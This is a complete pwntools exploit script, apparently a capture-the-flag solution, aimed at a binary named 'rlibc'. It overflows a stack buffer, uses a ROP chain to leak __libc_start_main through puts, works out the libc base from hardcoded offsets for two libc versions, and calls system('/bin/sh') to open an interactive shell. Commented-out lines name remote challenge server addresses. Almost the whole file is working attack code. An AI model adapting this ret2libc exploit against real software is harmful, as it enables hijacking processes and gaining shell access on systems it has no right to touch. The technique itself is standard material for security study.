#!/usr/bin/env python
from time import sleep

from pwn import *

# sh = gdb.debug('./rlibc')
# sh = remote("119.3.83.106", 10543)
rlibc = ELF("./rlibc")
# sh = remote("43.156.14.141", 1149)
sh = process("./rlibc")

def debug(cmd=''):
	cmd += "b main\n"
	gdb.attach(sh, cmd)
	pause()



puts_plt = p64(rlibc.plt["puts"])
main = p64(rlibc.symbols["main"])
rdi = p64(0x401273)
ret = p64(0x401274)

libc_start_main_got = p64(rlibc.got["__libc_start_main"])
payload = b"A" * 72 + rdi + libc_start_main_got + puts_plt + main
sh.sendlineafter(b"Enter your name:\n", payload)
sh.recvline()
libc_start_main = u64(sh.recv()[0:8])
libc_start_main -= 0x450A << 48
print(hex(libc_start_main))

debug()

# libc6_2.27-3ubuntu1.5_amd64
libc_start_main_off = 0x21BA0
sys_off = 0x4F420
sh_off = 0x1B3D88

# libc6_2.31-13+deb11u4_amd64
# libc_start_main_off = 0x23c20
# sys_off = 0x45e50
# sh_off = 0x196152


libcbase = libc_start_main - libc_start_main_off
system = p64(libcbase + sys_off)
binsh = p64(libcbase + sh_off)

payload = b"A" * 72 + rdi + binsh + ret + system + main
sh.sendline(payload)
# sleep(1)
# sh.sendline(b"cat flag")
sh.interactive()
